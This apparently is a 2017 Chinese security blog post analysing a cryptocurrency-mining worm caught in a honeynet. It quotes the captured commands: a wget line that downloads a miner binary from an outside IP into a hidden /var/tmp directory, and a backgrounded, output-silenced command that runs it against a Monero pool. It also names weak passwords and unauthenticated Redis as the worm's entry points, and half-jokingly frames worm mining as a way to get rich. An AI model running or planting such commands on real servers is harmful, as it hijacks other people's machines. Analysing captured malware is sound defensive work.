---
title: 蠕虫挖矿一例，无码
author: 余弦
date: '2017-03-06 00:00:00 +0000'

---

{% raw  %}
<p>给大家分享网络空间里发家致富的一个野路子：蠕虫挖矿，套比特币等虚拟货币。下面这是我们捕获到的真实案例，门开了一条缝，更多的请自行探索，以免有带坏嫌疑。</p><p><br></p><hr><p><br></p><p>今天凌晨，我们的蜜网系统跳出了个有趣的字符串：</p><p><br></p><blockquote><p>zaxa2aq@protonmail.com<br></p></blockquote><p><br></p><p>ProtonMail！前段时间我们的分享（<a href="http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=2651081191&amp;idx=1&amp;sn=aab699700de699fd9469a02abfd477b5&amp;chksm=8485d6f8b3f25fee296109ebbebbdef10cfc10c3a2420a39b0a1a8360e6ca6008ff3ff32df25&amp;scene=21#wechat_redirect" target="_blank" data_ue_src="http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=2651081191&amp;idx=1&amp;sn=aab699700de699fd9469a02abfd477b5&amp;chksm=8485d6f8b3f25fee296109ebbebbdef10cfc10c3a2420a39b0a1a8360e6ca6008ff3ff32df25&amp;scene=21#wechat_redirect">推荐安全且匿名的邮箱 ProtonMail</a>）似乎暗示着某种巧合，这不得不引起我们的兴趣。意料之内，匿名是把双刃剑，剑的另一端，“匿名之恶”会让人性丑恶发挥到极致。</p><p><br></p><p>以前我说过，黑暗森林法则同样适用于这个网络空间：被发现即被干掉。不好意思，这次是我们“干掉”了对方。</p><p><br></p><p>上面这个字符串完整内容是：</p><p><br></p><blockquote><p><span style="color: rgb(192, 0, 0); max-width: 100%; box-sizing: border-box ! important; overflow-wrap: break-word ! important; font-size: 16px;">(exec /var/tmp/.war/1 -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u zaxa2aq@protonmail.com -p x &amp;&gt; /dev/null &amp;)</span><br></p></blockquote><p><br></p><p>我简单解释下这条 Bash 命令：</p><p><br></p><blockquote><p>1.</p><p>exec，负责执行后面的命令，细节用途自行查阅。</p><p><br></p><p>2.<br></p><p>/var/tmp/.war/1，这个文件由下面这条命令创建：</p><p>wget http://95.128.182.166/javascripts/minerd -O /var/tmp/.war/1<br></p><p><br></p><p>3.</p><p>1 == minerd</p><p><br></p><p>4.</p><p>minerd 之后的参数：</p><p><span style="color: rgb(192, 0, 0); max-width: 100%; box-sizing: border-box ! important; overflow-wrap: break-word ! important; font-size: 16px;">-a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u zaxa2aq@protonmail.com -p x</span></p><p>目测和比特币等这类货币的挖矿有关，因为：minergate.com 就是这样的邪恶挖矿大平台。合法存在。<br></p><p><br></p><p>5.</p><p>&amp;&gt; /dev/null<br></p><p>无视标准输出与错误输出。</p><p><br></p><p>6.</p><p>最后的 &amp;，表示这条命令放到后台执行。</p><p><br></p><p>7.</p><p>最外层的小括号()，表示创建一个新的 Shell。<br></p></blockquote><p><br></p><p>上面的7点解释，重点看第4点就好。</p><p><br></p><p>为了确定我们的“目测”，我们用我们唯一的官方邮箱“<span style="color: rgb(192, 0, 0); max-width: 100%; box-sizing: border-box ! important; overflow-wrap: break-word ! important; font-size: 16px;">lant34m@protonmail.com</span>”同样在 minergate.com 上注册了个账号。在这个平台深度体验一番，不得不感慨，挖矿的世界真是眼花缭乱，满地宝藏既视感。</p><p><br></p><p>这个平台上，我们发现下面这个挖矿说明链接：</p><p><br></p><blockquote><p>https://minergate.com/altminers/cpuminer-multi-wolf<br></p></blockquote><p><br></p><p>部分区域截图如下：</p><p><br></p><p><img src="http://mmbiz.qpic.cn/mmbiz_png/kicMePHlP6TAw53mW0SkJRxSgibDGIACZjn73xHOC5BEduWN0GW3OugwDGRx5OJarJ80XEuicJwu2mamp7Szs2uicQ/0?wx_fmt=png" style="width: 759px !important; height: 462px !important;"></p><p><br></p><p>红框里的内容是：</p><p><br></p><blockquote><p><span style="color: rgb(192, 0, 0); max-width: 100%; box-sizing: border-box ! important; overflow-wrap: break-word ! important; font-size: 16px;">minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u lant34m@protonmail.com -p x</span><br></p></blockquote><p><br></p><p>对比下上面的第4点，这下确定了吧？另外，这个 minerd 本身还是开源的...你可以根据自己的特殊要求修改编译。</p><p><br></p><p>好，回到开头，这个蠕虫其实不是什么新鲜玩意，传播的主要方式是通过 Linux 服务器的弱口令及一些漏洞（比如：Redis 那个未授权访问缺陷）。<br></p><p><br></p><p>这个蠕虫感染一万台服务器，那么就有一万个挖矿节点...</p><p><br></p><p>别说运用什么 0day，就是用到一些上古时代的技术，我们也能在这个健壮又脆弱的网络空间里成为“有钱人”。<br></p><p><br></p><p>还好，我们不是坏人。</p><p><br></p><hr><p><br>这个案例够清晰吧？还想看到更多的吗？经过“懒人在思考”的白话润色，保证你即使不懂技术，也能涨姿势。</p><p><br></p><p>网络空间，这个巨型大脑，真美...<br></p><p><br></p><p><span style="max-width: 100%; font-size: 14px; box-sizing: border-box ! important; overflow-wrap: break-word ! important;">-----------------</span></p><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); box-sizing: border-box ! important; overflow-wrap: break-word ! important;"><span style="max-width: 100%; font-size: 14px; box-sizing: border-box ! important; overflow-wrap: break-word ! important;">微信公众号「<span style="max-width: 100%; color: rgb(192, 0, 0); box-sizing: border-box ! important; overflow-wrap: break-word ! important;"><strong style="max-width: 100%; box-sizing: border-box ! important; overflow-wrap: break-word ! important;">Lazy-Tho</strong></span></span><span style="max-width: 100%; font-size: 14px; box-sizing: border-box ! important; overflow-wrap: break-word ! important;"><span style="max-width: 100%; color: rgb(192, 0, 0); box-sizing: border-box ! important; overflow-wrap: break-word ! important;"><strong style="max-width: 100%; box-sizing: border-box ! important; overflow-wrap: break-word ! important;">ug</strong></span></span><span style="max-width: 100%; font-size: 14px; box-sizing: border-box ! important; overflow-wrap: break-word ! important;"><span style="max-width: 100%; color: rgb(192, 0, 0); box-sizing: border-box ! important; overflow-wrap: break-word ! important;"><strong style="max-width: 100%; box-sizing: border-box ! important; overflow-wrap: break-word ! important;">ht</strong></span>」</span></p><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); box-sizing: border-box ! important; overflow-wrap: break-word ! important;"><span style="max-width: 100%; font-size: 14px; box-sizing: border-box ! important; overflow-wrap: break-word ! important;">几个黑客在维护，都很懒，都想改变点什么</span></p>
{% endraw  %}

